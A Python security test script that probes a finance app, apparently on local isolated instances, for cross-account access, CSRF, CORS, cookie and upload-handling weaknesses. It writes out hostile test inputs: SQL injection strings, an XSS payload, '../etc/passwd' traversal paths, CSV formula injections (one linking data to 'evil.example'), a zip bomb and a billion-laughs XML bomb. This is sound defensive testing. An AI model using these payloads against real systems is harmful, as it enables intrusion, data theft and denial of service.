"""ARIA security probe (defensive, isolated instances only).

Usage:  python sec_probe.py private  http://127.0.0.1:8011
        python sec_probe.py accounts http://127.0.0.1:8018
Synthetic data only. Prints one line per check: [VERIFIED-PASS|VERIFIED-FAIL|INFO] id: detail.
No LLM is called by the checks below (chat is only exercised with deterministic small-talk when stated).
"""
import io, json, sys, uuid, zipfile
import requests

mode, BASE = sys.argv[1], sys.argv[2].rstrip("/")
ORIGIN = "http://localhost:5173"
RES = []


def rec(status, cid, detail=""):
    RES.append((status, cid, detail))
    print(f"[{status}] {cid}: {detail}", flush=True)


def check(cid, ok, detail=""):
    rec("VERIFIED-PASS" if ok else "VERIFIED-FAIL", cid, detail)


def sess():
    s = requests.Session()
    s.headers["Origin"] = ORIGIN
    return s


# ------------------------------------------------------------------ private mode
def private():
    A, B = uuid.uuid4().hex, uuid.uuid4().hex
    s = requests.Session()
    # profile / transactions are keyed by the id the client sends: knowing it == full access
    r = s.post(f"{BASE}/api/profile", json={"session_id": A, "monthly_income": 123456, "age": 31})
    rec("INFO", "P-prof-write", f"owner A write -> {r.status_code}")
    r = s.get(f"{BASE}/api/profile", params={"session_id": A}); a_income = r.json().get("profile", {}).get("monthly_income")
    r = s.get(f"{BASE}/api/profile", params={"session_id": B}); b_income = r.json().get("profile", {}).get("monthly_income")
    check("P-iso-profile-other-id-empty", b_income is None, f"B sees {b_income}, A sees {a_income}")
    # attacker who learns A's id (leaked URL, shared device, XSS, referrer) reads and overwrites
    r = s.get(f"{BASE}/api/profile", params={"session_id": A})
    check("P-trust-profile-read-by-id", r.json()["profile"]["monthly_income"] != 123456,
          "anyone presenting A's id reads A's profile (capability model; expected FAIL = by design)")
    r = s.post(f"{BASE}/api/profile", json={"session_id": A, "monthly_income": 1})
    rec("INFO", "P-trust-profile-write-by-id", f"overwrite by id holder -> {r.status_code}")
    r = s.delete(f"{BASE}/api/profile", params={"session_id": A})
    rec("INFO", "P-trust-profile-delete-by-id", f"delete by id holder -> {r.status_code}")
    # enumeration: ids are not listable
    for path in ("/api/profile", "/api/transactions", "/api/research/reports"):
        r = s.get(f"{BASE}{path}")
        rec("INFO", f"P-enum-no-id {path}", f"no id -> {r.status_code}")
    # transactions
    s.post(f"{BASE}/api/transactions", json={"session_id": A, "date": "2026-01-02", "category": "food", "amount": 100})
    r = s.get(f"{BASE}/api/transactions", params={"session_id": B})
    check("P-iso-txn", r.json() == [], f"B sees {len(r.json())} rows")
    r = s.get(f"{BASE}/api/transactions", params={"session_id": A})
    rec("INFO", "P-trust-txn-by-id", f"A id returns {len(r.json())} rows to any holder")
    # SQLi-ish ids stay inert
    for evil in ["' OR '1'='1", "x' UNION SELECT 1--", "%", "*"]:
        r = s.get(f"{BASE}/api/transactions", params={"session_id": evil})
        check(f"P-sqli-txn {evil!r}", r.status_code == 200 and r.json() == [], f"{r.status_code} {str(r.text)[:60]}")
    # chat history: conversation bound to first owner
    r = s.post(f"{BASE}/api/chat", json={"query": "hello", "session_id": "sess-" + A, "owner_id": A})
    rec("INFO", "P-chat-create", f"{r.status_code} {r.text[:80]!r}")
    r = s.get(f"{BASE}/api/chat/history", params={"session_id": "sess-" + A, "owner_id": B})
    check("P-iso-chat-history-wrong-owner", r.status_code == 403, f"{r.status_code}")
    r = s.get(f"{BASE}/api/chat/history", params={"session_id": "sess-" + A})
    check("P-iso-chat-history-no-owner", r.status_code == 403, f"{r.status_code}")
    r = s.get(f"{BASE}/api/chat/history", params={"session_id": "sess-" + A, "owner_id": A})
    rec("INFO", "P-trust-chat-history-right-owner", f"{r.status_code}")
    r = s.post(f"{BASE}/api/chat/clear", json={"session_id": "sess-" + A, "owner_id": B})
    check("P-iso-chat-clear-wrong-owner", r.status_code == 403, f"{r.status_code}")
    # conversation squatting: pre-claim a predictable session id
    r = s.post(f"{BASE}/api/chat", json={"query": "hello", "session_id": "victim-session-1", "owner_id": B})
    r2 = s.post(f"{BASE}/api/chat", json={"query": "hi", "session_id": "victim-session-1", "owner_id": A})
    rec("INFO", "P-squat", f"first claimant {r.status_code}, second owner -> {r2.status_code} (first claim wins)")
    # learning state: keyed by session id only
    s.post(f"{BASE}/api/quiz/answer", json={"session_id": A, "concept_id": "sip", "is_correct": True})
    pa = s.get(f"{BASE}/api/progress", params={"session_id": A}).json()
    pb = s.get(f"{BASE}/api/progress", params={"session_id": B}).json()
    check("P-iso-progress-other-id", pb.get("total_interactions") == 0, f"A={pa.get('total_interactions')} B={pb.get('total_interactions')}")
    # reports: need existing id; random ids 404
    r = s.get(f"{BASE}/api/research/reports/{uuid.uuid4().hex}", params={"owner_id": A})
    check("P-rep-unknown-404", r.status_code == 404, str(r.status_code))
    r = s.get(f"{BASE}/api/research/reports", params={"owner_id": B}); check("P-iso-report-list", r.json() == [], r.text[:60])
    # unauthenticated global/shared surfaces
    for path in ("/api/research/validation/latest?symbol=TCS.NS", "/api/research/scenario-backtest/universe/summary"):
        r = s.get(f"{BASE}{path}"); rec("INFO", f"P-shared {path}", str(r.status_code))
    r = s.post(f"{BASE}/api/tavus/end", json={})
    rec("INFO", "P-tavus-end-unauth", f"{r.status_code} (global, unauthenticated; kills the single active call)")
    # audio token
    r = s.get(f"{BASE}/api/audio/{'0'*32}"); rec("INFO", "P-audio-unknown", str(r.status_code))
    r = s.get(f"{BASE}/api/audio/..%2f..%2fetc"); rec("INFO", "P-audio-traversal", str(r.status_code))
    common(s, A)


# ------------------------------------------------------------------ accounts mode
def accounts():
    def signup(tag):
        s = sess(); email = f"{tag}-{uuid.uuid4().hex[:6]}@example.test"
        r = s.post(f"{BASE}/api/auth/register", json={"email": email, "password": "correct-horse-battery-1"})
        assert r.status_code == 200, (r.status_code, r.text)
        return s, r.json()["user"]["id"], r

    sa, ida, ra = signup("alice"); sb, idb, _ = signup("bob")
    ck = ra.headers.get("set-cookie", "")
    rec("INFO", "A-cookie-flags", ck.split(";", 0)[0][:12] + " ... " + "; ".join(p.strip() for p in ck.split(";")[1:]))
    check("A-cookie-httponly", "httponly" in ck.lower()); check("A-cookie-samesite-strict", "samesite=strict" in ck.lower())
    check("A-cookie-secure-when-https", "secure" in ck.lower(), "http origin in this test -> Secure absent expected; enforced when ARIA_APP_ORIGIN is https")
    # own data
    sa.post(f"{BASE}/api/profile", json={"session_id": ida, "monthly_income": 777777})
    sa.post(f"{BASE}/api/transactions", json={"session_id": ida, "date": "2026-01-02", "category": "food", "amount": 55})
    r = sa.get(f"{BASE}/api/profile", params={"session_id": ida}); check("A-own-profile", r.status_code == 200 and r.json()["profile"]["monthly_income"] == 777777, str(r.status_code))
    # cross-account (B uses A's id)
    for name, fn in {
        "profile-get": lambda: sb.get(f"{BASE}/api/profile", params={"session_id": ida}),
        "profile-summary": lambda: sb.get(f"{BASE}/api/profile/summary", params={"session_id": ida}),
        "profile-post": lambda: sb.post(f"{BASE}/api/profile", json={"session_id": ida, "monthly_income": 1}),
        "profile-delete": lambda: sb.delete(f"{BASE}/api/profile", params={"session_id": ida}),
        "profile-style-delete": lambda: sb.delete(f"{BASE}/api/profile/style", params={"session_id": ida}),
        "txn-get": lambda: sb.get(f"{BASE}/api/transactions", params={"session_id": ida}),
        "txn-insights": lambda: sb.get(f"{BASE}/api/transactions/insights", params={"session_id": ida}),
        "txn-post": lambda: sb.post(f"{BASE}/api/transactions", json={"session_id": ida, "date": "2026-01-02", "category": "food", "amount": 1}),
        "txn-delete": lambda: sb.delete(f"{BASE}/api/transactions", params={"session_id": ida}),
        "txn-sample": lambda: sb.post(f"{BASE}/api/transactions/sample", json={"session_id": ida}),
        "txn-import": lambda: sb.post(f"{BASE}/api/transactions/import", json={"session_id": ida, "import_id": "x"}),
        "txn-parse-form": lambda: sb.post(f"{BASE}/api/transactions/parse", data={"session_id": ida}, files={"file": ("a.csv", b"date,amount\n")}),
        "reports-list": lambda: sb.get(f"{BASE}/api/research/reports", params={"owner_id": ida}),
        "report-get": lambda: sb.get(f"{BASE}/api/research/reports/{uuid.uuid4().hex}", params={"owner_id": ida}),
        "chat-history": lambda: sb.get(f"{BASE}/api/chat/history", params={"session_id": "s-a", "owner_id": ida}),
        "chat-post": lambda: sb.post(f"{BASE}/api/chat", json={"query": "hello", "session_id": "s-a", "owner_id": ida}),
        "chat-clear": lambda: sb.post(f"{BASE}/api/chat/clear", json={"session_id": "s-a", "owner_id": ida}),
        "instr-ask": lambda: sb.post(f"{BASE}/api/instruments/ask", json={"id": "x", "question": "hi", "session_id": "s-a", "owner_id": ida}),
    }.items():
        r = fn(); check(f"A-xacct-{name}", r.status_code in (403, 404, 401, 422), f"{r.status_code}")
    # A's data intact
    r = sa.get(f"{BASE}/api/profile", params={"session_id": ida}); check("A-data-intact-after-attacks", r.json()["profile"]["monthly_income"] == 777777)
    # owner-less / bypass attempts
    for name, fn in {
        "chat-no-owner": lambda: sb.post(f"{BASE}/api/chat", json={"query": "hello", "session_id": "s-b"}),
        "history-no-owner": lambda: sb.get(f"{BASE}/api/chat/history", params={"session_id": "s-b"}),
        "dup-owner-param": lambda: sb.get(f"{BASE}/api/research/reports", params=[("owner_id", idb), ("owner_id", ida)]),
        "report-list-no-owner": lambda: sb.get(f"{BASE}/api/research/reports"),
        "owner-in-form-urlenc": lambda: sb.post(f"{BASE}/api/chat/clear", data={"session_id": "s-a", "owner_id": ida}),
        "json-ct-charset-case": lambda: sb.post(f"{BASE}/api/chat/clear", data=json.dumps({"session_id": "s-a", "owner_id": ida}), headers={"Content-Type": "APPLICATION/JSON"}),
        "json-text-plain": lambda: sb.post(f"{BASE}/api/chat/clear", data=json.dumps({"session_id": "s-a", "owner_id": ida}), headers={"Content-Type": "text/plain"}),
        "txn-text-plain-body": lambda: sb.post(f"{BASE}/api/transactions/sample", data=json.dumps({"session_id": ida}), headers={"Content-Type": "text/plain"}),
        "progress-other-conv": lambda: sb.get(f"{BASE}/api/progress", params={"session_id": "s-a"}),
    }.items():
        r = fn(); rec("INFO", f"A-bypass-{name}", f"{r.status_code} {r.text[:70]!r}")
    # unauthenticated
    anon = sess()
    for p in ("/api/profile?session_id=x", "/api/chat/history?session_id=x&owner_id=x", "/api/research/reports?owner_id=x",
              "/api/markets/overview", "/api/instruments/search?q=tcs", "/avatar/live", "/api/research/validation/latest?symbol=TCS.NS"):
        r = anon.get(f"{BASE}{p}"); check(f"A-anon {p}", r.status_code == 401, str(r.status_code))
    r = requests.get(f"{BASE}/", timeout=10); rec("INFO", "A-anon-static-root", str(r.status_code))
    # CSRF: wrong/missing Origin on mutation with a valid cookie
    for o in (None, "http://evil.example", "http://localhost:5174"):
        h = {"Origin": o} if o else {}
        s2 = requests.Session(); s2.cookies.update(sa.cookies)
        r = s2.post(f"{BASE}/api/profile", json={"session_id": ida, "monthly_income": 5}, headers=h)
        check(f"A-csrf-origin={o}", r.status_code == 403, str(r.status_code))
    r = requests.Session(); r.cookies.update(sa.cookies)
    g = r.get(f"{BASE}/api/profile", params={"session_id": ida}, headers={"Origin": "http://evil.example"})
    rec("INFO", "A-get-evil-origin", f"{g.status_code} (GET with cookie from foreign origin; SameSite=Strict + CORS decide readability) ACAO={g.headers.get('access-control-allow-origin')}")
    # CORS preflight from evil origin
    pf = requests.options(f"{BASE}/api/profile", headers={"Origin": "http://evil.example", "Access-Control-Request-Method": "POST"})
    check("A-cors-no-evil-origin", pf.headers.get("access-control-allow-origin") != "http://evil.example" and pf.headers.get("access-control-allow-origin") != "*", str(dict(pf.headers).get("access-control-allow-origin")))
    # login throttling and enumeration
    em = f"victim-{uuid.uuid4().hex[:6]}@example.test"
    codes = []
    for i in range(12):
        codes.append(sess().post(f"{BASE}/api/auth/login", json={"email": em, "password": "wrong-password-123"}).status_code)
    check("A-login-throttle", 429 in codes, str(codes))
    r1 = sess().post(f"{BASE}/api/auth/register", json={"email": "alice-dup@example.test", "password": "correct-horse-battery-1"})
    r2 = sess().post(f"{BASE}/api/auth/register", json={"email": "alice-dup@example.test", "password": "correct-horse-battery-1"})
    rec("INFO", "A-register-dup", f"{r1.status_code} then {r2.status_code} {r2.text[:80]!r} (enumeration: dup returns 409 distinct from 200)")
    # logout revokes
    sc, idc, _ = signup("carol"); ck = dict(sc.cookies)
    sc.post(f"{BASE}/api/auth/logout")
    s3 = requests.Session(); s3.cookies.update(ck)
    r = s3.get(f"{BASE}/api/profile", params={"session_id": idc}); check("A-logout-revokes", r.status_code == 401, str(r.status_code))
    # blocked shared integrations
    for p, m in (("/api/research/validation", "post"), ("/v1/x/chat/completions", "post"), ("/embed?conversation_url=x", "get"), ("/api/tavus/start", "post"), ("/api/tavus/end", "post")):
        r = getattr(sa, m)(f"{BASE}{p}", **({"json": {}} if m == "post" else {}))
        check(f"A-blocked-shared {p}", r.status_code in (403, 404), str(r.status_code))
    # websocket
    ws_checks(ida, idb, sa, sb)
    # audio isolation: no audio creation without TTS; token lookup of unknown token
    r = sb.get(f"{BASE}/api/audio/{'a'*32}"); check("A-audio-unknown", r.status_code == 404, str(r.status_code))
    common(sa, ida)


def ws_checks(ida, idb, sa, sb):
    import asyncio, websockets
    url = BASE.replace("http", "ws") + "/api/live/ws"

    async def go(cookie, origin, msg):
        h = {}
        if cookie: h["Cookie"] = cookie
        if origin: h["Origin"] = origin
        try:
            async with websockets.connect(url, additional_headers=h, open_timeout=8) as w:
                if msg is not None:
                    await w.send(json.dumps(msg))
                try:
                    return "open", await asyncio.wait_for(w.recv(), 8)
                except Exception as e:
                    return "open", f"{type(e).__name__} {getattr(e,'code','')} {getattr(e,'reason','')}"
        except Exception as e:
            return "refused", f"{type(e).__name__} {str(e)[:80]}"
    ck = lambda s: "; ".join(f"{k}={v}" for k, v in s.cookies.items())
    r = asyncio.run(go(None, ORIGIN, {"type": "ping"})); check("A-ws-anon-refused", r[0] == "refused", str(r))
    r = asyncio.run(go(ck(sa), "http://evil.example", {"type": "ping"})); check("A-ws-evil-origin-refused", r[0] == "refused", str(r))
    r = asyncio.run(go(ck(sa), ORIGIN, {"type": "ping"})); rec("INFO", "A-ws-own-ping", str(r))
    r = asyncio.run(go(ck(sb), ORIGIN, {"type": "user", "text": "hi", "owner_id": ida, "session_id": "s-a"}))
    check("A-ws-wrong-owner-closed", "1008" in r[1] or r[0] == "refused", str(r))


# ------------------------------------------------------------------ common (both modes)
def common(s, owner):
    # CORS
    pf = requests.options(f"{BASE}/api/profile", headers={"Origin": "http://evil.example", "Access-Control-Request-Method": "POST"})
    rec("INFO", f"C-cors-{mode}", f"ACAO={pf.headers.get('access-control-allow-origin')} ACAC={pf.headers.get('access-control-allow-credentials')}")
    h = requests.get(f"{BASE}/api/health").headers
    missing = [k for k in ("content-security-policy", "x-content-type-options", "x-frame-options", "referrer-policy", "strict-transport-security") if k not in {x.lower() for x in h}]
    check("C-security-headers", not missing, f"missing: {missing}")
    # reflected XSS in /embed (private only; accounts blocks)
    r = s.get(f"{BASE}/embed", params={"conversation_url": '";alert(document.domain);//'})
    rec("INFO", "C-embed-reflect", f"{r.status_code} reflected_unescaped={'\";alert(document.domain);//' in r.text}")
    # error leakage
    r = s.get(f"{BASE}/api/research/reports/%00", params={"owner_id": owner}); rec("INFO", "C-err-nul", f"{r.status_code} {r.text[:100]!r}")
    r = s.post(f"{BASE}/api/chat", data="{bad", headers={"Content-Type": "application/json"}); rec("INFO", "C-err-badjson", f"{r.status_code} {r.text[:100]!r}")
    r = s.get(f"{BASE}/api/instruments/..%2f..%2fetc%2fpasswd/quote"); rec("INFO", "C-instr-traversal", f"{r.status_code} {r.text[:80]!r}")
    r = s.get(f"{BASE}/docs"); rec("INFO", "C-openapi-docs-exposed", str(r.status_code))
    r = s.get(f"{BASE}/openapi.json"); rec("INFO", "C-openapi-json-exposed", str(r.status_code))
    uploads(s, owner)


def csv_up(s, owner, name, data, ctype="text/csv"):
    return s.post(f"{BASE}/api/transactions/parse", data={"session_id": owner}, files={"file": (name, data, ctype)}, timeout=60)


def uploads(s, owner):
    ok = b"Date,Description,Debit,Credit,Balance\n02/01/2026,Zomato order,450.00,,10000\n03/01/2026,Salary,,50000,60000\n"
    r = csv_up(s, owner, "ok.csv", ok); rec("INFO", "U-ok-csv", f"{r.status_code} rows={r.json().get('rows_total') if r.ok else r.text[:80]}")
    r = csv_up(s, owner, "big.csv", b"a,b\n" + b"1,2\n" * (1_400_000)); check("U-oversize-5MB-rejected", r.status_code == 413, f"{r.status_code}")
    r = csv_up(s, owner, "x.exe", b"MZ\x90\x00" + b"\0" * 100, "application/octet-stream"); check("U-wrong-type", r.status_code in (400, 415, 422), f"{r.status_code} {r.text[:80]!r}")
    r = csv_up(s, owner, "../../../../etc/passwd.csv", ok); rec("INFO", "U-filename-traversal", f"{r.status_code} echoed_filename={r.json().get('filename') if r.ok else None!r} (file not stored: parsed in memory)")
    r = csv_up(s, owner, "<img src=x onerror=alert(1)>.csv", ok); rec("INFO", "U-filename-html", f"{r.status_code} echoed={r.json().get('filename') if r.ok else None!r} (JSON; React escapes)")
    # formula injection: merchant begins with = + - @
    fm = b"Date,Description,Debit,Credit,Balance\n02/01/2026,=HYPERLINK(\"http://evil.example\"&A1),450.00,,10000\n03/01/2026,@SUM(1+1)*cmd|' /C calc'!A0,99,,1\n04/01/2026,+cmd|' /C calc'!A0,10,,1\n"
    r = csv_up(s, owner, "f.csv", fm)
    merchants = [x["merchant"] for x in r.json().get("rows", [])] if r.ok else []
    rec("INFO", "U-formula-csv-merchants-preserved", f"{merchants}")
    check("U-formula-sanitised-in-preview", all(not str(m).startswith(("=", "+", "@")) for m in merchants), "merchant text starting with =,+,@ is stored/returned verbatim if FAIL (matters for any CSV/XLSX export)")
    # zip bomb-lite xlsx
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", "<Types/>"); z.writestr("xl/workbook.xml", "<workbook/>"); z.writestr("xl/worksheets/sheet1.xml", b"0" * (80 * 1024 * 1024))
    data = buf.getvalue(); rec("INFO", "U-xlsx-bomb-size", f"compressed={len(data)} expanded=80MB")
    r = csv_up(s, owner, "bomb.xlsx", data, "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"); check("U-xlsx-bomb-rejected", r.status_code in (413, 422), f"{r.status_code} {r.text[:100]!r}")
    # many-member zip
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as z:
        for i in range(2500): z.writestr(f"f{i}.xml", "")
    r = csv_up(s, owner, "many.xlsx", buf.getvalue()); check("U-xlsx-many-members", r.status_code in (413, 422), f"{r.status_code}")
    # xml entity expansion (billion laughs) inside an xlsx-ish
    bl = '<?xml version="1.0"?><!DOCTYPE l [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"><!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;"><!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">]><workbook>&e;</workbook>'
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", "<Types/>"); z.writestr("xl/workbook.xml", bl)
    import time; t = time.time(); r = csv_up(s, owner, "xml.xlsx", buf.getvalue()); check("U-xlsx-entity-bomb", r.status_code in (413, 422) and time.time() - t < 20, f"{r.status_code} in {time.time()-t:.1f}s")
    # malformed pdf, binary junk as csv, nul bytes, huge single line
    r = csv_up(s, owner, "x.pdf", b"%PDF-1.4\n" + b"\0" * 1000); check("U-bad-pdf", r.status_code in (413, 422), f"{r.status_code}")
    r = csv_up(s, owner, "line.csv", b"a" * (4 * 1024 * 1024)); check("U-huge-line", r.status_code in (413, 422, 200), f"{r.status_code}")
    r = csv_up(s, owner, "nul.csv", b"Date,Amount\n\x00\x00,\x00\n"); check("U-nul-bytes-no-500", r.status_code < 500, f"{r.status_code}")
    # no filename / missing file
    r = s.post(f"{BASE}/api/transactions/parse", data={"session_id": owner}); check("U-missing-file-422", r.status_code == 422, str(r.status_code))
    # voice: oversize, empty, non-audio
    r = s.post(f"{BASE}/api/voice/transcribe", files={"file": ("a.wav", b"")}); check("U-voice-empty", r.status_code == 422, str(r.status_code))
    r = s.post(f"{BASE}/api/voice/transcribe", files={"file": ("a.wav", b"\0" * (11 * 1024 * 1024))}); check("U-voice-oversize", r.status_code == 413, str(r.status_code))
    r = s.post(f"{BASE}/api/voice/transcribe", files={"file": ("../../x.wav", b"RIFFjunk")}); rec("INFO", "U-voice-junk-path-name", f"{r.status_code} {r.text[:80]!r}")
    # request-level limit
    r = s.post(f"{BASE}/api/chat", data=b"x" * (13 * 1024 * 1024), headers={"Content-Type": "application/json"}); check("U-req-12MB-cap", r.status_code == 413, str(r.status_code))
    # rate limit (POST /min 120 per peer)
    import collections
    c = collections.Counter();
    for i in range(130):
        c[s.post(f"{BASE}/api/voice/transcribe", files={"file": ("a.wav", b"")}).status_code] += 1
    check("U-rate-limit-engages", 429 in c, str(dict(c)))


{"private": private, "accounts": accounts}[mode]()
print("\nSUMMARY", sum(1 for r in RES if r[0] == "VERIFIED-FAIL"), "fail /", sum(1 for r in RES if r[0] == "VERIFIED-PASS"), "pass /", sum(1 for r in RES if r[0] == "INFO"), "info")
